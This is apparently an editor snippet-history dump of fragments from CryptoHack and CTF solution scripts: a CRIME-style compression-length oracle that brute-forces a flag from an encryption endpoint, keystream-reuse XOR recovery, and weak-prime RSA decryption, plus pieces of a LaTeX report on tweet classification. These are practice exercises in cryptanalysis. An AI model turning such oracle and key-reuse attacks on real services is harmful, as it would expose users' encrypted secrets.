ca87e8ff8e8bda741cf1b3344b503165|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|14|1|V|python
	    plaintext = bytes('crypto{', 'utf-8').hex()
74c3306d9ad0593e17174287ac09b0d1|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|5|1|V|python
	from itertools import product
cbfce65ce3d618f26ddaaaafdd91120e|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|17|5|V|python
	    plaintext = bytes('a', 'utf-8').hex()
69f7b2d7d8cce6f087f09de0d70e8574|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|19|1|V|python
	    ciphertext = bytes.fromhex(requests.get(url=URL_ENCRYPT + plaintext + '/').json()['ciphertext'])
becd90790477c66dc160a96cbd55d8d5|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|22|5|V|python
	    byte_quads = map(''.join, product(string.printable, repeat=2))
d8830fa4dd6e42bfc53a9c11d163ecce|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|19|22|v|python
	bytes.fromhex(requests.get(url=URL_ENCRYPT + control + '/').json()['ciphertext'])
fc5364bf9dbfa34954526becad136d4b|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|23|64|v|python
	control
7beb3da1325c013ec2c7e4488e066da4|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|25|17|V|python
	                print(enc)
3b9238504990272ebf31c7487660390c|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|25|13|V|python
	            except:
c6f58872973236bd20c8671391d3315f|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|23|13|V|python
	            try:
e5bda629a767048d509761b9d3d4b5e6|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|21|5|V|python
	    print(control_len)
244defacfb2e77026a1bb375afe7476e|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|29|5|V|python
	    # plaintext = bytes('crypto{', 'utf-8').hex()
	    # ciphertext = bytes.fromhex(requests.get(url=URL_ENCRYPT + plaintext + '/').json()['ciphertext'])
8e06f52600e648e9d131086a0cd8998a|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|17|6|v|python
	or i in range(secret_len//4):
2108d4a1237cd35436dc20a8900d291c|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|26|11|V|python
	                decrypted += block
9bd88a4144de461b9ac36a91132fd6ab|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|26|17|V|python
	                print(decrypted)
d203ce9b54660ccc8fb70453218f7eed|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|16|5|V|python
	    decrypted = b''
b2b4dd2eae55b055865c897d241b22ee|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|16|5|V|python
	    while True:
edaea21223ba673bbcc9f7b3e4bc4ec9|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|25|13|V|python
	            break
14f90fb74e4324dfd17a878db7aee1aa|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|33|1|V|python
	pool = mp.Pool(32)
	i = 0
	for c in pool.imap_unordered(hashit, possible, chunksize=100000):
	    mappings[c[0]] = c[1]
	pool.close()
3e79a6fb77c9419a7a2d8ab912db05b2|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|26|5|V|python
	    for block in byte_quads:
5815ebf1b6a839ec63d87f4312939902|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|26|9|V|python
	        enc = bytes.fromhex(requests.get(url=URL_ENCRYPT + bytes(block,'utf-8').hex() + '/').json()['ciphertext'])
	        enc_len = len(enc)
	        if enc_len < control_len:
	            print(block)
b651f4561aa68ccb6fa6ce3ebf64c5ec|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|30|4|V|python
	        mappings[c[0]] = c[1]
c7494877776f068a45a08ac66b47bee2|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|28|5|V|python
	    i = 0
977d508794f20ebbeefa1fe1b4a6f084|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|28|25|v|python
	hashit
a6c6a775fe8ef1667678ba2d53c28a6c|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|7|1|V|python
	from general.xor.xor import *
1632dbbd0cd4e65bcd3fd4efaa9e7a4a|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|21|16|v|python
	'####'
83fc07362259b9da92a1e6d9ae34657c|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|21|17|v|python
	rypto
2def90c8b4fe77cc2162693606bed340|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|16|1|V|python
	    # for c in string.ascii:
	    #     plaintext = bytes(c,'utf-8').hex()
	#     ciphertext = requests.get(url=URL_ENCRYPT + plaintext + '/').json()['ciphertext']
	#     print(len(ciphertext))
f6397afbf0d6cd74d1611d8abe9b7429|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|10|25|^v|python
	requests.get(url=URL_ENCRYPT + bytes(block,'utf-8').hex() + '/').
f31c5121110a447e1d59a75dad8fa9ea|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|11|5|V|python
	    print(reply)
b07024823e0624f4d9666778f05c496b|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|20|5|V|python
	    control = b'####'
6244f36b44aac444af2b8e30f119a417|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|21|5|V|python
	    control_len = len(control_ct)
728eb382b140f7e3bfa9fa1a67f61f5c|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|9|5|V|python
	def send_request(block):
	    reply = requests.get(url=URL_ENCRYPT + bytes(block,'utf-8').hex() + '/')
	    enc = bytes.fromhex(reply.json()['ciphertext'])
	    enc_len = len(enc)
	    if enc_len < control_len:
	        print(block)
769c3330a49984ecb456b9f78020c8c6|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|9|1|V|python
	def send_request(block):
f93486a74a9e3357713a014cdc41ade0|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|22|5|V|python
	    for c in pool.imap_unordered(send_request, byte_quads, chunksize=100000):
c16bf2542cc34567d355784564d365d7|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|22|9|V|python
	        pass
aaa6d5eaae57d5ce5e00d3f11c93fd1a|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|21|5|V|python
	    byte_quads = map(''.join, product(string.printable, repeat=4))
ea6d61a728c054bad75974af3f034c1c|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|9|22|V|python
	    reply = requests.get(url=URL_ENCRYPT + bytes(block,'utf-8').hex() + '/')
	    enc = bytes.fromhex(reply.json()['ciphertext'])
	    enc_len = len(enc)
	    if enc_len < control_len:
	        print(block)
b32b1d4234cb10d5f8b7097b616fcf2a|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|15|5|V|python
	    control_ct = bytes.fromhex(requests.get(url=URL_ENCRYPT + control.hex() + '/').json()['ciphertext'])
dadc620445ee0232841dceea6f6f7161|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|19|13|V|python
	            test_len = 
391a0b0f02e5d294db0b095caaadc8e4|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|17|1|V|python
	            test_payload = known + decrypted + unlikely + bytes(c, 'utf-8')
a6bf987e5180812218988fbfef19c275|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|17|1|V|python
	            test_payload = known + decrypted + unlikely + bytes(c, 'utf-8')
	            reply = requests.get(url=URL_ENCRYPT + test_payload.hex() + '/')
	            enc = bytes.fromhex(reply.json()['ciphertext'])
149e1b6298f37197d1ffa91501ae3007|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|22|52|v|python
	+ bytes(c, 'utf-8')
9d99bbcd7c89e740fafd0ca22c65dbc5|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|27|16|v|python
	enc_len
96bbb97a43ae1dc76ab11482862b70a9|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|27|26|v|python
	control_len
4c17be98750f9375fdf285288cc24c18|file:///home/neo/cryptohack/block-ciphers/ctr/ctrime.py|28|17|v|python
	print(block)
79bf17c6da8b378ac403d611f89b4e68|file:///home/neo/cryptohack/block-ciphers/ctr/bean.py|28|1|V|python
	    encrypted_flag = bytes.fromhex(requests.get(url=URL_FLAG).json()['encrypted'])
9c24df14b26f6f341796edc4177cf3c4|file:///home/neo/cryptohack/block-ciphers/ctr/stream_of_conciousness.py|11|9|V|python
	        encrypted_flag = bytes.fromhex(requests.get(url=URL_FLAG).json()['encrypted'])
603ed52f39c533e447cd52f2f2cad062|file:///home/neo/cryptohack/block-ciphers/ctr/stream_of_conciousness.py|11|53|v|python
	URL_FLAG
08f0a60abb91ab9ba2b1ab12a3d45863|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|16|9|V|python
	        print(pair[0])
1ba3e34fed8fc580c437300cdc629641|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|16|9|V|python
	        print(pair[1])
db4a43716d8aaaf0b9f9afe8ecb6d577|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|20|20|v|python
	pair[1]
e252228c5d921879e66e697bb41621e6|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|25|9|V|python
	        print(out)
b655d0ea58a83cefcb1aeef6e411bd8d|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|35|5|V|python
	        print(pair)
c8236afa50418991bc69c7d1b8645682|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|21|1|V|python
	        first = pair[0]
	        second = pair[1]
	        len1 = len(first)
	        len2 = len(second)
	        min_len = min(len1, len2)
	        xored = xor_bytes(first[:min_len], second[:min_len])
ce94dfd0cf04d4b8d08e48171134cdab|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|27|1|V|python
	        out = xor_bytes(xored[:len_known], known)
c90ae688b2a3b1fd0751fd743eb385cd|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|49|40|v|python
	known
25b8e711cde276f604318c79a0ae5cf0|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|30|26|V|python
	                print(out)
	                print(pair)
90191feb137de849a4a1a3cdc655b1db|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|39|9|V|python
	        print(quad)
c794e02f832fcfa7bbb5b6f7bb4f913b|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|51|13|V|python
	            print(out)
66700de91bc79ea1c1f3c372a1f7889d|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|41|9|V|python
	        print('Candidate: ', temp)
f43db02103174472d65a16b1977dfcad|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|42|1|V|python
	        for pair in correct_pairs:
	            first = pair[0]
	            second = pair[1]
	            len1 = len(first)
	            len2 = len(second)
	            min_len = min(len1, len2)
	            xored = xor_bytes(first[:min_len], second[:min_len])
	            out = xor_bytes(xored[:len_temp], temp)
d241cfc26556d63cd6a70df807ab7409|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|37|21|V|python
	    for pair in correct_pairs: 
	        if ciphertext not in pair:
	            correct_pairs.remove(pair)
1c0e97a1859225d1b015b7c002456363|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|31|35|V|python
	                for letter in word:
	                    if letter not in string.ascii_letters:
	                        cand = False
0e99849ac527b31870e6f38596f9cb7c|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|41|29|V|python
	                            print(out)
e124716d157799df8490fb7c16fc008e|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|58|13|V|python
	            print(out[-3:])
11ea69c34645e11e86bfdd3003ea2395|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|39|36|v|python
	(second, first)
602d1ff2d7f9e655db5a1a48ae896f4d|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|41|40|v|python
	correct_pairs
158e83c5cd5b964a738a23f529b8ebac|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|37|1|V|python
	                        if first < second:
	                            pair = pair
	                        else:
	                            pair = pair[::-1]
8317cdbabf529c6b6434b355f53f423a|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|36|21|V|python
	                    if cand:
08ca15c8f2f645a671e409b2e624dba9|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|36|25|V|python
	                        if out not in correct_out:
9af11a3d9b0c77a6a5c62d74b6945352|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|42|28|v|python
	3
	    #
85ecd379fbd630d16b8a7d06e72f6cb7|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|38|21|V|python
	                    print(out)
e6a18600c5c1949b4334947c19625820|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|104|1|V|tex
	    \begin{itemize}
	    \end{itemize}
429079e52f342c49301a02e207bfde06|file:///home/neo/Documents/parameters.txt|189|1|V|text
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
f09a706670b66b5352e3ba621bf19953|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|168|1|V|tex
	    \item \textbf{Dense:} densified data
292e7d42dcf1cb46c4b4f637ada45bc6|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|169|27|v|tex
	densified data
6c179557a7f53377b044c8e5917469c9|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|170|19|v|tex
	Dense:
af5c669a2dfc79b6eadb7747eb15f76a|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|171|26|v|tex
	 densified data
4c4cf500173a1f00eac50f013b5b79d2|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|174|1|V|tex
	    \item \textbf{Location:} location was added in the training 
be9469719aa6efa2fc3bd5768bc406d7|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|175|19|v|tex
	Location:
aa02834413f32f4d138750db91893693|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|181|1|V|tex
	\newpage
	\begin{table}[]
cb8cd526ac3ed56b0825661b4ecf49a3|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|182|1|V|tex
	\newpage
	\begin{table}[]
	\begin{tabular}{|c|c|c|c|c|c|c|}
c1323fa5714c5cc5a4099c80e3970006|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|183|1|V|tex
	\small\addtolength{\tabcolsep}{-7pt}
2147db86d3d86d6d990de8f9a7adf354|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|183|1|V|tex
	\small\addtolength{\tabcolsep}{-7pt}
	\center
f28ab2776f6524d8794aaa6f121c18ea|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|179|14|V|tex
	% Please add the following required packages to your document preamble:
	% \usepackage{multirow}
	\newpage
	\begin{table*}[t]
	\small\addtolength{\tabcolsep}{-7pt}
	\center
	\begin{tabular}{|c|c|c|c|c|c|c|}
	\hline
	\multirow{2}{*}{Model} & \multicolumn{3}{c|}{Best result (preprocessing first)}                                                                                                                                                                  & \multicolumn{3}{c|}{Best result (parameters first)}                                                                                                                                                                          \\ \cline{2-7} 
	                       & Preprocessing methods                                                                            & Parameter values                                                                                       & Score       & Preprocessing methods                                                                                      & Parameter values                                                                                   & Score      \\ \hline
	KNeighbors             & \begin{tabular}[c]{@{}c@{}}dense, tfidf, clear, \\ lemmatize,\\ keyword, freq = 25\end{tabular}  & \begin{tabular}[c]{@{}c@{}}Num neighbors = 7\\ Weights = distance\\ Algorithm = ball tree\end{tabular} & 0.68752726  & \begin{tabular}[c]{@{}c@{}}dense, tfidf, clear, \\ keyword, freq = 30\end{tabular}                         & \begin{tabular}[c]{@{}c@{}}Num neighbors = 3\\ Weights = distance\\ Algorithm = brute\end{tabular} & 0.67378703 \\ \hline
	LogisticRegression     & \begin{tabular}[c]{@{}c@{}}dense, countvec\\ clear, lemmatize,\\ freq = 15\end{tabular}          & \begin{tabular}[c]{@{}c@{}}solver = sag\\ penalty = l2\\ c = 1.1\end{tabular}                          & 0.75637419  & \begin{tabular}[c]{@{}c@{}}countvec, clear,\\ lemmatize,\\ freq = 15\end{tabular}                          & \begin{tabular}[c]{@{}c@{}}solver = sag\\ penalty =  l2\\ c = 1.0\end{tabular}                     & 0.75635503 \\ \hline
	SGDClassifier          & \begin{tabular}[c]{@{}c@{}}countvec, clear, stem, \\ lemmatize, location\\ freq =20\end{tabular} & \begin{tabular}[c]{@{}c@{}}loss = hinge\\ penalty = elasticnet\\ l1 ratio = 0.5\end{tabular}           & 0.74881037  & \begin{tabular}[c]{@{}c@{}}dense, countvec,\\ clear, stem, lemmatize\\ freq = 20\end{tabular}              & \begin{tabular}[c]{@{}c@{}}loss = hinge\\ penalty = l2\\ l1 ratio =  0.15\end{tabular}             & 0.75482895 \\ \hline
	SVC                    & \begin{tabular}[c]{@{}c@{}}dense, countvec, clear\\ stem, lemmatize,\\ freq =15\end{tabular}     & \begin{tabular}[c]{@{}c@{}}kernel =rbf\\ c = 1.5\end{tabular}                                          & 0.75502877  & \begin{tabular}[c]{@{}c@{}}dense, countvec, clear\\ lemmatize,\\ freq = 15\end{tabular}                    & \begin{tabular}[c]{@{}c@{}}kernel =rbf\\ c = 1.5\end{tabular}                                      & 0.75963463 \\ \hline
	BernoulliNB            & \begin{tabular}[c]{@{}c@{}}dense, tfidf, clear.\\ lemmatize, keyword,\\ freq = 15\end{tabular}   & alpha = 1.0                                                                                            & 0.749885947 & \begin{tabular}[c]{@{}c@{}}dense, tfidf, clear\\ clear, stem, lemmatize,\\ keyword, freq = 15\end{tabular} & alpha = 0.1                                                                                        & 0.74969168 \\ \hline
	DecisionTree           & \begin{tabular}[c]{@{}c@{}}dense, tfidf, clear\\ lemmatize, \\ freq = 20\end{tabular}            & \begin{tabular}[c]{@{}c@{}}max features = auto\\ criterion = entropy\end{tabular}                      & 0.703428298 & \begin{tabular}[c]{@{}c@{}}dense, tfidf, clear\\ freq = 15\end{tabular}                                    & \begin{tabular}[c]{@{}c@{}}max features = sqrt\\ criterion = entropy\end{tabular}                  & 0.69623725 \\ \hline
	GaussianNB             & \begin{tabular}[c]{@{}c@{}}dense, tfidf, clear\\ stem, lemmatize,\\ keyword\end{tabular}         & -                                                                                                      & 0.704472392 & -                                                                                                          & -                                                                                                  & -          \\ \hline
	GradientBoosting       & \begin{tabular}[c]{@{}c@{}}dense, countvec\\ clear, stem, lemmatize,\\ freq = 15\end{tabular}    & \begin{tabular}[c]{@{}c@{}}learning rate = 0.2\\ max depth = 30\end{tabular}                           & 0.726905899 & -                                                                                                          & -                                                                                                  & -          \\ \hline
	MultinomialNB          & \begin{tabular}[c]{@{}c@{}}dense, tfidf, clear\\ lemmatize, keyword,\\ freq = 15\end{tabular}    & alpha = 0.1                                                                                            & 0.750952398 & \begin{tabular}[c]{@{}c@{}}dense, countvec\\ clear, lemmatize,\\ keyword, freq =15\end{tabular}            & alpha = 1.5                                                                                        & 0.74780593 \\ \hline
	\end{tabular}
	\end{table*}
179d16d7ed6375bd27412bf1b63e8353|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|183|1|V|tex
	\center
dcdfb02805fba07277344ebae1879f79|file:///home/neo/cryptohack/general/xor/xor.py|61|1|v|python
	    lemur_contents = lemur_contents[:lemur_contents.find(b'%tEXtdate')]
703768590625541f22bf1b2e4ac74e89|file:///home/neo/cryptohack/general/xor/xor.py|58|1|V|python
	    flag_contents = flag_contents[145:]
	    lemur_contents = lemur_contents[145:]
	    flag_contents = flag_contents[:flag_contents.find(b'%tEXtdate')]
	k
aec9ac8198ab71d68b71cda954b2b6de|file:///home/neo/cryptohack/general/xor/xor.py|62|1|V|python
	    image = Image.frombytes("RGBA", (width, height), secret_contents)
36d408ee15bcf776921d977f7c3c33f2|file:///home/neo/cryptohack/general/mathematics2/adrien.py|5|1|V|python
	from general.mathematics.mathematics import *
a2d9b7013952962f40f1bd55538ab375|file:///home/neo/cryptohack/general/mathematics2/adrien.py|19|9|V|python
	        print(e)
a8d4ca53a612798d6191928d94013299|file:///home/neo/cryptohack/general/mathematics2/adrien.py|20|9|V|python
	        print(m)
9f54889909af04f3a0f6b2387c36fa7a|file:///home/neo/cryptohack/general/xor/xor.py|60|1|V|python
	    secret = open('secret.png', 'w')
	    secret.write(str(xor_bytes(flag_contents, lemur_contents[:len(flag_contents)])))
	    secret.close()
06769faaca64e11364d9cb3dc2d639c1|file:///home/neo/cryptohack/general/xor/xor.py|53|5|V|python
	    lemur_image = 'general/xor/lemur.png'
6a8bfb5541c0680c5ba9893fd1cef020|file:///home/neo/cryptohack/general/xor/xor.py|52|5|V|python
	    Image.SAVE(secret_image)
dc7058bc7bf59d73581193cda2412327|file:///home/neo/cryptohack/general/xor/xor.py|49|1|V|python
	    lemur_image = Image.open('general/xor/lemur.png', mode='r').convert('RGB')
f0cb89b88bb6652d401e30c5708b31c5|file:///home/neo/cryptohack/general/xor/xor.py|48|5|v|python
	lemur_image
baf9eb4bd85e3a7194d8cbf2f3b10c61|file:///home/neo/cryptohack/general/xor/xor.py|55|1|V|python
	    lem = ImageChops.logical_or(secret_image, lemur_image)
b90105211e016420de6994fc24408866|file:///home/neo/cryptohack/general/xor/xor.py|51|1|V|python
	    lemur_image = ImageChops.invert(lemur_image)
9d06fad2112f128b9ca7cca04bc6d04b|file:///home/neo/cryptohack/general/xor/xor.py|58|5|V|python
	    lem = ImageChops.logical_or(secret_image, lemur_image)
	    # lem = ImageChops.logical_or(lem, flag_image)
	    lem.save('lem.png')
50c81f3d75b96b8c5ceb1df8a8a167d2|file:///home/neo/cryptohack/general/mathematics2/adrien.py|15|5|V|python
	    print(pow(a, (p-1)//2, p))
df5ef43fe24607c720b10baa33fcdbe9|file:///home/neo/cryptohack/general/mathematics2/adrien.py|18|1|V|python
	        print(n, (p-1)//2, p)
fe894c32fb62d00d2d1e8e201de17b1a|file:///home/neo/cryptohack/general/mathematics2/adrien.py|19|9|V|python
	        m = -n % p
519bc4c62e5bde773e65fe16f15efffb|file:///home/neo/cryptohack/general/mathematics2/adrien.py|13|5|V|python
	    flag= b'abcdefhijklmnopq'
fcd4ddb09e7f423009bb33048ab6b4fb|file:///home/neo/cryptohack/general/mathematics2/adrien.py|20|1|V|python
	        # print(pow(m, (p-1)//2, p))
	        # print('n:', n, '-n%p:', m, 'e:', e, 'a^n%p:', pow(a, n, p), 'a^m%p', a^m%p)
9aa64347814c13411f6a62b1046d9ba4|file:///home/neo/cryptohack/general/mathematics2/adrien.py|14|4|V|python
	    # print(''.join([bin(i)[2:].zfill(8) for i in flag]))
ded50c9e2b72bfebe3cfd5f93b0543bd|file:///home/neo/cryptohack/general/mathematics2/adrien.py|21|5|V|python
	    # for num in output:
ad2b8095b48f14d5f26a39756e3693ea|file:///home/neo/cryptohack/general/mathematics2/data.txt|1|1|V|text
	N = 14905562257842714057932724129575002825405393502650869767115942606408600343380327866258982402447992564988466588305174271674657844352454543958847568190372446723549627752274442789184236490768272313187410077124234699854724907039770193680822495470532218905083459730998003622926152590597710213127952141056029516116785229504645179830037937222022291571738973603920664929150436463632305664687903244972880062028301085749434688159905768052041207513149370212313943117665914802379158613359049957688563885391972151218676545972118494969247440489763431359679770422939441710783575668679693678435669541781490217731619224470152467768073
5d7d9c4442e45ce4b7a97a9d9cd2aae6|file:///home/neo/cryptohack/general/mathematics2/data.txt|2|6|v|text
	12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137
b6ab0f99e260856ac7cf08bcd81202f1|file:///home/neo/cryptohack/rsa/starter/starter.py|4|5|V|python
	    print(pow(12, 0x10001, 17*23))
cc623c76ab9235c348e8188b3691f413|file:///home/neo/cryptohack/general/mathematics2/adrien.py|4|1|V|python
	sys.path.insert(1, '~/cryptohack')
	from general.mathematics.mathematics import *
	
	if __name__=='__main__':
061e849fe8cb31d6ea491e8f97f4edcf|file:///home/neo/cryptohack/general/mathematics2/adrien.py|4|1|V|python
	sys.path.insert(1, '~/cryptohack')
	from general.mathematics.mathematics import *
129988293e53894d3fcea2475ce4d8c5|file:///home/neo/cryptohack/rsa/starter/starter.py|14|5|V|python
	    print(pow())
bd7b6f4c554ddaf99dbacd0ea2170c62|file:///home/neo/cryptohack/rsa/starter/starter.py|12|37|v|python
	totient
396344e54a9b9eb6410bad5c06fbd72c|file:///home/neo/cryptohack/rsa/starter/starter.py|14|5|V|python
	    print((e*inv)%totient)
62ab177500e25322002bf1ac9fa07b4b|file:///home/neo/cryptohack/rsa/starter/starter.py|15|5|V|python
	    g, x, y = egcd(a, m)
d1f1f1aacfe956d250634d83b129e859|file:///home/neo/cryptohack/general/mathematics/mathematics.py|58|5|V|python
	    print(extended_gcd)
71d8edbe2c9c92030aac890510984ec4|file:///home/neo/cryptohack/general/mathematics/mathematics.py|29|5|V|python
	    def modinv(a, m):
9c7718c2c13ffe3bda07bb44e0e0e6ab|file:///home/neo/cryptohack/rsa/starter/starter.py|14|5|V|python
	    g, x, y = extended_gcd(e, totient)
db74f547fc36174a5911f711c4f92d41|file:///home/neo/cryptohack/rsa/starter/starter.py|14|5|V|python
	    inv = x % totient
499630598b577234ac99e08c56fcce38|file:///home/neo/cryptohack/rsa/starter/starter.py|14|5|V|python
	    print(inv)
c98fe0f2a4e16978ed13ac3842b41167|file:///home/neo/cryptohack/rsa/starter/starter.py|11|5|V|python
	    print(msg_hash)
09d7fd112595067d895b1d8d2fcb5311|file:///home/neo/cryptohack/rsa/prime1/output.txt|3|1|V|text
	ct = 39207274348578481322317340648475596807303160111338236677373
06773ea9df21ace32a06663094dc9ab0|file:///home/neo/cryptohack/rsa/prime1/inferius.py|1|1|V|python
	#!/usr/bin/env python3
	
	from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytes
1a27f671cf9aa0d09367eba1f6ecb498|file:///home/neo/cryptohack/rsa/prime1/solve.py|9|5|V|python
	    p = 742449129124467073921545687640895127535705902454369756401331
275b659522c81da4cd6af6fa42b18fdd|file:///home/neo/cryptohack/rsa/prime1/monoprime.txt|1|1|V|text
	n = 171731371218065444125482536302245915415603318380280392385291836472299752747934607246477508507827284075763910264995326010251268493630501989810855418416643352631102434317900028697993224868629935657273062472544675693365930943308086634291936846505861203914449338007760990051788980485462592823446469606824421932591                                                                  
	e = 65537
	ct = 161367550346730604451454756189028938964941280347662098798775466019463375610700074840105776873791605070092554650190486030367121011578171525759600774739890458414593857709994072516290998135846956596662071379067305011746842247628316996977338024343628757374524136260758515864509435302781735938531030576289086798942  
dce8b270fa2cd3ae3d50c8cf708b8281|file:///home/neo/cryptohack/rsa/prime1/solve.py|1|1|V|python
	#!/usr/bin/env python3
e45677bc34e51772bd7c646f267228d5|file:///home/neo/cryptohack/rsa/prime1/solve.py|3|1|V|python
	from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytes
a18e8eca961e75d903013de4efe4679c|file:///home/neo/cryptohack/rsa/prime1/monoprime.py|6|1|V|python
	    n = 171731371218065444125482536302245915415603318380280392385291836472299752747934607246477508507827284075763910264995326010251268493630501989810855418416643352631102434317900028697993224868629935657273062472544675693365930943308086634291936846505861203914449338007760990051788980485462592823446469606824421932591
be52d5c8abdffce38880c3d7d06d784d|file:///home/neo/cryptohack/rsa/prime1/monoprime.py|9|1|V|python
	    d = math.sqrt(n)
11db0ca1b429b3be61a65bebd4c7afac|file:///home/neo/cryptohack/rsa/prime1/solve.py|4|1|V|python
	import sys
	sys.path.insert(1, '~/cryptohack')
	from general.mathematics.mathematics import *
cf73d20201c508032e67bfeb34611188|file:///home/neo/cryptohack/rsa/prime1/monoprime.py|13|35|v|python
	n*(n
112c3aa77afce8d4c59c3d1cd803820a|file:///home/neo/cryptohack/rsa/prime1/monoprime.py|1|1|V|python
	#!/usr/bin/env python3
	import math
	from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytes
	import sys
	sys.path.insert(1, '~/cryptohack')
	from general.mathematics.mathematics import *
578a70c69166147f61e4a1693d5ad67b|file:///home/neo/cryptohack/rsa/prime1/monoprime.py|13|1|V|python
	    d = multiplicative_inverse(e, n-1)
	    print(d)
	    pt = pow(ct, d, n)
	    decrypted = long_to_bytes(pt)
	    print(decrypted)
7b30f14f432a9348b7725a054d65df34|file:///home/neo/cryptohack/rsa/prime1/square_eyes.py|9|9|v|python
	
ebef09f85ff4d20e92590512a83ea19e|file:///home/neo/cryptohack/rsa/prime1/square_eyes.py|12|5|V|python
	    # d = multiplicative_inverse(e, N-1)
d6b47782c59f997ead94751c9772c8c4|file:///home/neo/cryptohack/rsa/prime1/square_eyes.py|13|1|V|python
	    d = multiplicative_inverse(e, (p-1)*(p-1))
880aa5c1297cc33c4c8723dbbfcbddf8|file:///home/neo/cryptohack/rsa/prime1/square_eyes.py|16|1|V|python
	    pt = pow(ct, d, N)
46ce93542e19bc3b82970ad7d7ce9c4f|file:///home/neo/cryptohack/rsa/prime1/square_eyes.py|17|5|V|python
	    pt = pow(pt, d, N)
8f2b6f644540ec0cef15ce016d66ddbd|file:///home/neo/cryptohack/rsa/prime1/square_eyes.py|13|5|V|python
	    d = multiplicative_inverse(e, N-1)
730710c6e779a420229a323036f28c2d|file:///home/neo/cryptohack/rsa/prime1/square_eyes.py|15|11|V|python
	    print(p*p)
	    print(N)
1a60ef49564efe0038e2e11795a45ede|file:///home/neo/cryptohack/rsa/prime1/manyprime.py|1|5|v|python
